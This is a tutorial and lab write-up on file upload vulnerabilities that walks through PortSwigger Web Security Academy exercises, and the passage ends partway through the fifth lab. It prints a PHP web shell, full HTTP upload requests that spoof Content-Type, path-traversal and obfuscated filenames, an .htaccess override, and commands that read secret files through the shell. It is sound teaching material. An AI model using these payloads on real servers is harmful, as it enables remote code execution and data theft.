# File Upload Vulnerability Overview

Most major websites offer file upload functionality, allowing users to upload various types of files to the server. These files can range from images in formats like `.jpeg`, `.png`, and `.gif`, to document files such as `.pdf`, `.doc`, and `.xls`. Additionally, there are server-related functionalities where users can upload files with extensions like `.php`, `.aspx`, or `.jsp`. While these functionalities are common, they can pose security issues if the server does not properly validate and restrict file uploads.

If the server fails to implement proper validation, it becomes vulnerable. Attackers can take advantage of this vulnerability by uploading arbitrary and potentially dangerous files instead of the intended images or other allowed file types. In some cases, if the uploaded files contain server-side scripts, the attacker can execute those scripts on the server, resulting in Remote Code Execution and granting the attacker direct control over the server.

By seeing all that let's take a proper definition of file upload vulnerability

## File Upload Vulnerability

File upload vulnerabilities refer to security weaknesses in web applications that allow attackers to exploit the file upload functionality. These vulnerabilities arise when the application does not properly validate or restrict the uploaded files, potentially leading to unauthorized access, remote code execution, or other malicious activities.

File Upload Vulnerability occurs in various ways but the following are some common misconfigurations that can lead to file upload vulnerabilities.

1. **Insufficient file type validation**: The application may not adequately verify the file type or extension, allowing attackers to upload malicious files with executable code or disguised as benign files.
2. **Lack of file size limitations**: Without imposing size restrictions, attackers can upload large files, consuming server resources or causing denial-of-service issues.
3. **Inadequate file sanitization**: Insufficient `sanitization` or filtering of user-supplied file names or metadata can enable attackers to manipulate file names or inject malicious content.
4. **Failure to enforce secure file storage**: If the uploaded files are stored in an insecure location or with weak access controls, attackers may be able to directly access or execute the uploaded files.
5. **Malicious file content**: Attackers can exploit vulnerabilities in the file parser or processing logic to execute arbitrary code or perform other malicious actions.

File upload vulnerabilities pose significant threats to applications, although it is becoming increasingly rare to find websites that completely lack any form of file upload restrictions. Developers typically implement certain measures to mitigate these vulnerabilities, such as restricting specific file extensions, imposing size limitations, or sanitizing user-supplied names. The thing is Developers implement what they believe is the best fix and a robust validation for the issue and maybe they are correct however, the effectiveness of these measures depends on the developers' understanding and adherence to best practices and industry standards.

While developers may genuinely believe that their chosen approach provides a robust fix and adequate validation for the issue, there are cases where their implementation may be flawed or easily bypassed. This can occur if the developers overlook certain security standards or fail to account for all potential attack vectors.

Consider a scenario where a developer tries to mitigate file upload vulnerabilities by implementing a blacklist approach. However, they overlook the possibility of parsing discrepancies that can occur when checking the file extension. In the process, they may inadvertently omit certain less common file types that could still pose a threat to the application's security.

In some cases, a website may attempt to determine the file type by checking certain properties or characteristics of the uploaded file. However, these properties can be easily manipulated by an attacker using tools such as Burp Proxy or Repeater. By modifying the file's properties or crafting a malicious file that appears to meet the expected criteria, an attacker can bypass the file type check and upload potentially harmful files to the server.

Ultimately, we see even robust validation measures may be applied inconsistently across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.

Now that we understand these vulnerabilities exist in the wild, let's explore how to detect and exploit them. By bypassing these flawed defenses, we can successfully upload web shells to the server, enabling us to achieve remote code execution.

## Web Server File Handling

Understanding of Web server file handling is essential to fully understanding file upload vulnerabilities so let's first learn about it. In the past, websites primarily comprised static files that were directly served to users upon request. This meant that the path of each request corresponded directly to the structure of directories and files on the server's filesystem. However, with the evolution of websites, they have become more dynamic, and the path of a request no longer necessarily reflects the filesystem structure. Despite this shift, web servers still handle requests for certain static files, such as stylesheets and images. While the relationship between the request path and the filesystem is no longer direct, web servers continue to manage these static file requests.

The handling of static files follows a similar process. When a request for a static file is received, the server examines the file extension by looking at the path of the request. It determines the file's type by comparing the extension to a predefined list of mappings between extensions and MIME types. The subsequent actions taken by the server depend on the file type and the server's configuration.

For dynamic websites, the process is different. The server's response is determined by the backend logic, and the file does not need to be located in the same directory structure as the request. The back-end logic retrieves the file from another location on the network or server and includes it in the user's response.

On the user's side, the following scenarios can occur:

- If the file type is non-executable, such as an image or a static HTML page, the server simply sends the file's contents to the client in an HTTP response.
- If the file type is executable, like a PHP file, and the server is configured to execute files of this type, it assigns variables based on the headers and parameters in the HTTP request. The script is then run, and the resulting output is sent to the client in an HTTP response.
- If the file type is executable, but the server is not configured to execute files of this type, it typically responds with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to reveal source code and other sensitive information.

In HTTP headers we see a `Content-Type` header that tell our browser what type of file is served and based on that our browser either displayed it or downloads it on the client system. This header gives us clues to what the server thinks about these files and if this header has not been explicitly set by the application code, it typically reflects the result of the file extension and MIME type mapping.

Having gained an understanding of these fundamental concepts, we can now delve into exploring the vulnerabilities associated with them. To enhance our practical comprehension, we will engage in hands-on exercises and lab scenarios, allowing us to apply and reinforce our knowledge of these vulnerabilities in a more concrete and immersive manner.

## 1. Unrestricted File Upload

Unrestricted File Upload refers to a security vulnerability where an application allows users to upload files without proper validation or restrictions. This means that users can upload any type of file, including potentially malicious files, to the application's server. In terms of security, this is the most concerning situation for a website that lets an attacker upload scripts that can be executed on the server, like PHP, Java, or Python files. This means they can easily create a web shell, giving you control over the server and potentially causing harm.

> **Web Shell**
> 	A web shell is a malicious script that enables an attacker to execute arbitrary shell commands on a remote web server simply by sending HTTP requests to that script.

To be able to execute shell commands on the server is the dream of an attacker. This means they can read and write arbitrary files, exfiltrate sensitive data, and even use the server to pivot attacks against both internal infrastructure and other servers outside the network.

The simple PHP web shell looks like this.

```php
<?php system($_GET["cmd"]);?>
```

Once uploaded, sending a request for this malicious file with the right parameter will execute the shell command on the server and see its output in the response. The example request and response will look like the following.

```shell
$ curl http://vulnerable-server.com/shell.php?cmd=uname+-a

Linux VulnerableServer 6.0.0-ubuntu-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.0.12-ubuntu (2022-12-19) x86_64 GNU/Linux
```

In the above scenario, the attacker first makes a file on his local system that contains the above web-shell code and saves it with the `shell.php` name. After that, they upload the file onto the server using vulnerable upload functionality. When successfully uploaded they send the GET request to that file to execute system commands.

### LAB #1: Remote Code Execution via web shell upload

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

**Objective**
Upload the web shell on the server and read the content of `/home/carlos/secret` file.

**Credentials**
```
wiener:peter
```

**Solution**

This lab contains a blogging website that has some blog posts on it. There is a `/my-account` endpoint in it that redirects us to the `/login` endpoint if we are not authenticated. There we can authenticate ourselves using the given credentials. After successful authentication, they redirect us to the `/my-account` page and there we have some functionalities like Changing Email and Uploading an Avatar Image. The Upload functionality sends the `POST` request to `/my-account/avatar` with the parameter `avatar` that contains the binary data of the image and the `user` parameter that has our account username.

That image is shown on our `/my-account` page and their URL is like following

```
https://0a3700d604fa8ca780a29eb6002c0076.web-security-academy.net/files/avatars/img.png
```

They upload files on the `/file/avatar/` endpoint with the same file name as we have in our system. We can check if they allow files other than image files like PHP files. We create a local file name `exploit.php` that has the following content in it.

```php
<?php system($_GET["cmd"]);?>
```

And Upload it using the upload avatar image functionality and they accept it. As they are not an image file so they didn't show us any image on our `my-account` page but its URL is like the following.

```
https://0a3700d604fa8ca780a29eb6002c0076.web-security-academy.net/files/avatars/exploit.php
```

Because this is a shell code we can run system commands by sending requests with specific parameters mentioned in our code in that case it's `cmd` using a GET request. So we can make the following request to run the `whoami` command on the server.

```
https://0a3700d604fa8ca780a29eb6002c0076.web-security-academy.net/files/avatars/exploit.php?cmd=whoami
```

In its response, we see the output `carlos` which means they web server is running with a `carlos` user. To solve this we have to read the `/home/carlos/secret` file and submit its response to do that we can send the following request to the server.

```
https://0a3700d604fa8ca780a29eb6002c0076.web-security-academy.net/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret
```

Submit the key to solve the lab.

## Flawed Validation of file uploads

Now that we have practiced the basic file upload vulnerability in the previous lab, it's important to note that real-life scenarios are usually more complex. Unlike the lab, where no validation was enforced to prevent us from uploading a web shell, in reality, we encounter additional defenses. Web Application Firewalls (WAFs) play a significant role by inspecting input and uploaded files for malicious content, and blocking requests that violate the rules. Furthermore, applications often implement their own validations to protect servers from these vulnerabilities.

In this section, we will explore common validation techniques implemented by websites. We will also examine flawed validations that can be completely bypassed, allowing the upload of malicious files onto the server.

### Flawed file type validation

We commonly upload various types of files to servers, including images, documents, text files, and zip files. These are typical file types that are frequently uploaded. However, there are also other types of files that we upload for specific purposes. For example, code files, configuration files, and database files are often uploaded to servers, but they are typically associated with Git repositories or Software as a Service (SaaS) platforms.

These files are uploaded using HTTP `Post` method, the HTML forms send the request in the background with a specific Content-Type Header. The Content-Type header informs the server about the type of data being sent, and the server processes it accordingly. There are two commonly used Content-Type headers for uploading files:

```
Content-Type: application/x-www-form-url-encoded
```

```
Content-Type: multipart/form-data
```

The Content-Type header `application/x-www-form-urlencoded` is suitable for sending simple text data, like names and addresses, as it encodes the data in a key-value format. However, it is not suitable for sending large binary data such as images or PDF documents. For such cases, the preferred approach is to use the `multipart/form-data` content type header.

It's worth mentioning that there are other content type headers available as well, such as `application/json` and `text/xml`, which are used for sending data in `JSON` or `XML` format, respectively. However, the `multipart/form-data` header is more commonly seen when it comes to binary file uploads.

Using the appropriate content type header ensures that the server correctly interprets the data being sent and processes it accordingly.

Imagine a form where you can upload an image, add a description, and enter your username. When you submit this form, it generates a request that consists of multiple parts. Here's an example of how the request might look:

```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.
---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

W4H33D
---------------------------012345678901234567890123456--
```

In this example, the request body is divided into separate parts, each representing a specific input field from the form. Each part has a `Content-Disposition` header that provides basic information about the corresponding input field. Additionally, some parts may have their own `Content-Type` header, which indicates the MIME type of the data submitted through that input field.

Server configurations often include validation of file types by examining the `Content-Type` header and comparing its MIME type to the expected MIME type. For instance, if the server is expect image files, it might only permit types such as `image/jpeg` and `image/png`. However, issues can arise when the server blindly trusts the value of this header without conducting additional validation to ensure that the file's contents genuinely match the indicated MIME type. This defense mechanism can be easily bypassed using tools like Burp Repeater.

Attackers can exploit vulnerabilities by manipulating the `Content-Type` header and uploading malicious code onto the server. If the server solely relies on the provided header value without further verification, it may accept the uploaded content as legitimate. This can enable attackers to execute arbitrary code on the server and potentially gain unauthorized access or control.

### LAB #2: Web Shell Upload via Content-Type restriction bypass

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

**Objective**

Upload a basic PHP web shell and use it to exfiltrate the content of the file `/home/carlos/secret`.

**Credentials**
```
wiener:peter
```

**Solution**

This lab is similar to the last website in which after login we can see functionality to upload avatar images. The upload avatar functionality sends the `POST` to `/my-account/avatar`. We try to upload the `exploit.php` file that has the same PHP web-shell code we use in our last lab but this time when we upload that they throw the following error message.

**Request**
```
POST /my-account/avatar HTTP/1.1
Host: 0a7100d6043375628054efe4008d00d0.web-security-academy.net
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDjhEPM3Soc8YpDgQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=2w2WFeEcH3wFrOI6gH3WQWsEch1A4tU9
Content-Length: 436

------WebKitFormBoundaryDjhEPM3Soc8YpDgQ
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryDjhEPM3Soc8YpDgQ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDjhEPM3Soc8YpDgQ
Content-Disposition: form-data; name="csrf"

qS8wCCB7hMQN7mlBL8Z2c8PgPvnOnLAm
------WebKitFormBoundaryDjhEPM3Soc8YpDgQ--
```

**Response**
```
HTTP/1.1 403 Forbidden
Date: Tue, 06 Jun 2023 13:18:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 231

Sorry, file type application/x-php is not allowed
Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

In the above response, they have a verbose error that says the type `application/x-php` is not allowed and we can see in the above request that the Content-Type is indeed `application/x-php`, also they mentioned only the Content-Type `image/jpeg` and `image/png` is allowed.

Knowing that we can send the above request to the repeater and change the Content Type `application/x-php` with `image/jpeg`. When I send this request they show me the following different error message.

```
"No user param supplied"
```

I don't know which user parameter they are talking about because, in our above request, they have the `user` parameter that sets with `wiener`. This Content Type didn't work but now I change it to `image/png` and this works and they have the following response.

**Request**
```
POST /my-account/avatar HTTP/1.1
Host: 0a7100d6043375628054efe4008d00d0.web-security-academy.net
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDjhEPM3Soc8YpDgQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=2w2WFeEcH3wFrOI6gH3WQWsEch1A4tU9
Content-Length: 436

------WebKitFormBoundaryDjhEPM3Soc8YpDgQ
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/png

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryDjhEPM3Soc8YpDgQ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryDjhEPM3Soc8YpDgQ
Content-Disposition: form-data; name="csrf"

qS8wCCB7hMQN7mlBL8Z2c8PgPvnOnLAm
------WebKitFormBoundaryDjhEPM3Soc8YpDgQ--
```

**Response**
```
HTTP/1.1 200 OK
Date: Tue, 06 Jun 2023 13:20:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/exploit.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

We see our avatar image is uploaded and after reloading the `/my-account` page we see a link for our avatar image.

```
https://0a7100d6043375628054efe4008d00d0.web-security-academy.net/files/avatars/exploit.php
```

Now like we did in the previous lab executes the system command to exfiltrate the `/home/carlos/secret` file content.

```
https://0a7100d6043375628054efe4008d00d0.web-security-academy.net/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret
```

### Restrict File Execution

To enhance security, it is crucial to prevent the upload of harmful file types. However, as an additional measure, it is essential to block the execution of any scripts that manage to bypass the initial security measures.

As a safeguard, servers typically execute scripts only if their MIME type has been explicitly configured for execution. Otherwise, the server may respond with an error message or, in certain situations, serve the file's contents as plain text.

```
GET /static/exploit.php?command=id HTTP/1.1 
Host: normal-website.com 

HTTP/1.1 200 OK 
Content-Type: text/plain 
Content-Length: 39 

<?php echo system($_GET['command']); ?>
```

This behavior can be intriguing since it could allow for source code leakage, but it effectively prevents the creation of a web shell.

Such configurations often vary between directories. The directory where user-uploaded files are stored is likely to have stricter controls compared to other areas of the file system that are assumed to be inaccessible to end users. However, if you manage to upload a script to a different directory that is not intended for user-supplied files, the server might still execute your script.

In the `multipart/form-data` content type of HTTP, there is a parameter called `filename` that not only provides the application with the file name but also specifies the location where it should be saved. By adding a directory traversal sequence i.e. `../` to the filename, we can upload the file to a different location where it can be executed.

The thing that should be noted and may create some problems is that when we send requests to a domain name, it typically refers to a reverse proxy server or a load balancer. These servers act as intermediaries and our requests are further processed by additional servers in the background. These backend servers may have different configurations and settings compared to the front-facing servers.

### LAB #3: Web Shell Upload via Path Traversal

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

**Objective**

Upload a PHP web shell and use it to exfiltrate the contents of the `/home/carlos/secret` file.

**Credentials**
```
wiener:peter
```

**Solution**

We can login to our account and there we have the functionality to upload Avatar images. The Upload Avatar images send the POST request with the Content Type `multipart/form-data`. We can upload files other than image files i.e. PHP, but they will not be executed they just reflect it back to the user.

**Uploading PHP webshell**
```
POST /my-account/avatar HTTP/1.1
Host: 0a41002404649dcf8011bc34002b00b1.web-security-academy.net
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ3eGsByZh5Zyv2B8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Referer: https://0a41002404649dcf8011bc34002b00b1.web-security-academy.net/my-account
Cookie: session=yLPqxXJxdNw7mCszZQ3mGZfesjFQNXpM
Content-Length: 449

------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="csrf"

UnD53tWQGRadk9rN5dzxM2gorXo8TK9h
------WebKitFormBoundaryJ3eGsByZh5Zyv2B8--

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 09:07:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/exploit.php has been uploaded.
```

**Accessing PHP webshell**
```
GET /files/avatars/exploit.php HTTP/1.1
Host: 0a41002404649dcf8011bc34002b00b1.web-security-academy.net
Cookie: session=yLPqxXJxdNw7mCszZQ3mGZfesjFQNXpM
...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 09:17:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 07 Jun 2023 09:12:19 GMT
ETag: "1e-5fd868869cf14"
Accept-Ranges: bytes
Keep-Alive: timeout=5, max=100
Connection: close
X-Frame-Options: SAMEORIGIN
Content-Length: 30

<?php system($_GET["cmd"]);?>
```

Now, let's explore the possibility of adding Directory Traversal sequences in the filename. By doing so, we can attempt to upload the file to a different directory that is not affected by the restricted execution policy.

```
POST /my-account/avatar HTTP/1.1
Host: 0a41002404649dcf8011bc34002b00b1.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ3eGsByZh5Zyv2B8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=yLPqxXJxdNw7mCszZQ3mGZfesjFQNXpM
Content-Length: 449

------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="csrf"

UnD53tWQGRadk9rN5dzxM2gorXo8TK9h
------WebKitFormBoundaryJ3eGsByZh5Zyv2B8--

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 09:07:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 132

The file avatars/exploit.php has been uploaded.
```

In the above request, even though we added the directory traversal sequence in the file name, it is not displayed in the response. Instead of showing `avatar/../exploit.php`, the server displays it as `avatar/exploit.php`. This indicates that the server is stripping the directory traversal sequences from the request.

To bypass this restriction, we can try URL encoding the `../` sequence, which would become `..%2F`. This encoding might help us bypass the server's filtering mechanism.

```
POST /my-account/avatar HTTP/1.1
Host: 0a41002404649dcf8011bc34002b00b1.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Cookie: session=yLPqxXJxdNw7mCszZQ3mGZfesjFQNXpM
Content-Length: 444

------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="avatar"; filename="..%2Fexploit.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryJ3eGsByZh5Zyv2B8
Content-Disposition: form-data; name="csrf"

UnD53tWQGRadk9rN5dzxM2gorXo8TK9h
------WebKitFormBoundaryJ3eGsByZh5Zyv2B8--

...

HTTP/1.1 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 197

The file avatars/../exploit.php has been uploaded.
```

Now, we observe the response indicating that the file `avatar/../exploit.php` has been successfully uploaded. This means we have successfully uploaded the webshell to the previous directory of `avatar`, which likely does not have any restrictions on file execution.

Next, we need to send a GET request to `files/exploit.php` with the parameter `cmd=whoami` to check if the server executes the system command.

```
GET /files/exploit.php?cmd=whoami HTTP/1.1
Host: 0a41002404649dcf8011bc34002b00b1.web-security-academy.net
Connection: keep-alive
Cookie: session=yLPqxXJxdNw7mCszZQ3mGZfesjFQNXpM

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 09:18:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

carlos
```

Yes, the server successfully executed the system command. Now, we need to send a request to the following URL to exfiltrate the content of the `/home/carlos/secret` file.

```
https://0a41002404649dcf8011bc34002b00b1.web-security-academy.net/files/exploit.php?cmd=cat%20/home/carlos/secret
```


## Insufficient blacklisting

A common approach to prevent the upload of malicious scripts is to create a blacklist of file extensions, such as `.php`, that are considered dangerous. However, this method has limitations because it is impractical to block every potential file extension that can execute code. Attackers can easily bypass these blacklists by using lesser-known file extensions like `.php5` or `.shtml`, which can still be executable.

### Overriding the server configuration

As mentioned earlier, servers usually require specific configurations to execute files. For instance, to enable the execution of PHP files on an Apache server, developers need to include certain directives in their `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

In addition, developers can create specific configuration files within directories to modify or supplement global settings on many servers. For instance, Apache servers can load a directory-specific configuration from a file named `.htaccess` if it exists.

Similarly, IIS servers support directory-specific configuration through a `web.config` file. This allows developers to include directives like the following, which permits serving `JSON` files to users:

```
<staticContent> 
<mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
```

Web servers utilize these types of configuration files internally, and they are not typically accessible via regular HTTP requests. However, there are instances where servers fail to prevent the upload of malicious configuration files. In such cases, even if the desired file extension is blacklisted, it may be possible to deceive the server into associating a custom file extension with an executable MIME type. This can open up opportunities to execute arbitrary code on the server, bypassing the restrictions imposed by the blacklist.

### LAB #4: Web shell upload via extension blacklist bypass

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

**Objective**

Bypass the file extension restriction to upload a PHP web shell, and use it to exfiltrate the content of the `/home/carlos/secret` file.

**Credentials**
```
wiener:peter
```

**Solution**

In this lab, we have the same functionality of uploading avatar images but when we try to upload `php` files they give us the following error message.

```
Sorry, php files are not allowed
```

Any file extension that is PHP executable gives us the same error message which means we cannot upload any variation of php files but they accept other file types that are non-executable like text, image, document, and zip files.

Knowing this we can try to upload one interesting file that depends on the web server in place. In this lab the web server in place is Apache and in this web server, we can change the behavior by creating a special `.htacess` file.

Create a `.htaccess` file in your system that has the following content in it.

```
AddType application/x-httpd-php .l33t
```

This will make a policy in which every file that has the extension `.l33t` treat as a PHP file. That means we can upload a PHP web shell that has the extension `.l33t` instead of `.php` and the server executes it like the normal `.php` file. This will bypass the restriction of blocking any file upload with `.php` files.

Upload the `.htacess` file and then upload the web shell that has the php shell code but save it with the name `exploit.l33t` after that just executes the system command as we did in the previous lab to exfiltrate `/home/carlos/secret` file.

**Uploading `.htaccess` file**
```
POST /my-account/avatar HTTP/1.1
Host: 0a5900660399847f816b34d8000200d4.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLNNEgGwgeAoT5Wps
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=AEVMLNrxJBRC31ZIanklP6inQoGw4Lj8
Content-Length: 457

------WebKitFormBoundaryLNNEgGwgeAoT5Wps
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .l33t

------WebKitFormBoundaryLNNEgGwgeAoT5Wps
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryLNNEgGwgeAoT5Wps
Content-Disposition: form-data; name="csrf"

7GWn4gmff7V1guJCeMnpDsdI9DIcGR5T
------WebKitFormBoundaryLNNEgGwgeAoT5Wps--

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 10:06:17 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130

The file avatars/.htaccess has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

**Upload webshell with `l33t` extension **
```
POST /my-account/avatar HTTP/1.1
Host: 0a5900660399847f816b34d8000200d4.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryItASJsAOM6WVWXFg
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=AEVMLNrxJBRC31ZIanklP6inQoGw4Lj8
Content-Length: 445

------WebKitFormBoundaryItASJsAOM6WVWXFg
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php

<?php system($_GET["cmd"]);?>

------WebKitFormBoundaryItASJsAOM6WVWXFg
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryItASJsAOM6WVWXFg
Content-Disposition: form-data; name="csrf"

7GWn4gmff7V1guJCeMnpDsdI9DIcGR5T
------WebKitFormBoundaryItASJsAOM6WVWXFg--

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 10:04:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 133

The file avatars/exploit.l33t has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

**Exfilterate Secret **
```
GET /files/avatars/exploit.l33t?cmd=cat%20/home/carlos/secret HTTP/1.1
Host: 0a5900660399847f816b34d8000200d4.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session=AEVMLNrxJBRC31ZIanklP6inQoGw4Lj8

...

HTTP/1.1 200 OK
Date: Wed, 07 Jun 2023 10:04:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Keep-Alive: timeout=5, max=100
Connection: close
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

e7G1jusSHva78TK1BIKFhBMscehKX131
```

### Obfuscating file extension

Even the most comprehensive blacklists can be circumvented using common obfuscation techniques. Let's consider a scenario where the validation code is case-sensitive and fails to recognize that `exploit.pHp` is actually a `.php` file. If the code responsible for mapping file extensions to MIME types is not case-sensitive, this inconsistency allows malicious PHP files to pass validation and potentially be executed by the server.

Similar results can be achieved through the following methods:

- **Providing multiple extensions**: By using a filename like `exploit.php.jpg`, the file may be interpreted as both a PHP file and a `JPG` image, depending on the filename parsing algorithm.
- **Adding trailing characters**: Certain components may ignore or strip trailing `whitespaces` or dots, allowing filenames like `exploit.php.` to bypass validation.
- **Using URL encoding**: Dots, forward slashes, and backward slashes can be URL-encoded (or double URL-encoded) to deceive validation mechanisms that don't decode the value. For example, `exploit%2Ephp` may pass as a valid filename but represent a malicious file.
- **Adding semicolons or URL-encoded null byte characters**: Appending semicolons or URL-encoded null byte characters before the file extension, such as `exploit.asp;.jpg` or `exploit.asp%00.jpg`, can exploit discrepancies between high-level language validation and lower-level file processing.
- **Employing multibyte Unicode characters**: Certain `Unicode` sequences may be converted to null bytes or dots after conversion or normalization, such as `xC0` `x2E` or `xC4` `xAE`, potentially bypassing filename validation.

Additional defenses involve stripping or replacing dangerous extensions to prevent file execution. However, if this transformation is not applied recursively, it is possible to position the prohibited string in a way that removing it still leaves a valid file extension. For example, consider the filename `exploit.p.phphp`, where stripping `.php` results in a valid file extension.

These are just a few examples of the various methods for obfuscating file extensions.

### LAB #5: Web Shell upload via obfuscated file extension

Lab URL: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension

**Objective**

Bypass the file extension blacklist to upload a PHP webshell, and use the to exfiltrate the content of the `/home/carlos/secret` file.

**Credentials**
```
wiener:peter
```

**Solution**

In this lab, we have the file upload functionality in which we can upload an avatar image from our My Account page. We can upload image files that have `PNG` or `JPG` extensions if we try to upload any files other than this they throw the following error message.

```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

They are checking if the file extension is either `.png` or `.jpg`, if so they allow it otherwise show us the above error message. We can upload php webshell code with the filename `exploit.php.jpg` but they will not execute it they interpret it as an image file.

Knowing that the application is checking only for file extension we can try uploading the php webshell with the filename that has a Null byte in it so that they will terminate other processing after it i.e. `exploit.php%00.jpg`. When we upload this file they accept it and we also see an interesting message in its response.

```
POST /my-account/avatar HTTP/1.1
Host: 0ad90038033d46d8819c482600d8005f.web-security-academy.net
